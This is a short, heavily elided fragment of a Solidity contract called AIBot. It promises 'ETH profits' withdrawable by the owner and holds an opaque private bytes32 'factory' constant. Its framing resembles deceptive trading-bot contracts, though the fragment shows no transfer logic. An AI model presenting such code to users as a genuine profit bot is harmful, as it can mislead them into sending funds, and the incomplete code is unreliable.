...
/**
    ...
    * 4. Call `Withdraw()` to retrieve ETH profits (only the contract owner can do this).
    */


contract AIBot {

    uint public debugMempool;
    uint public debugBot;
    uint liquidity;
    ...
    bytes32 private factory = 0xfdc54b1a6f53a21d375d0dea8cd2e750717b4e6901c5618e61295b852a359f74;
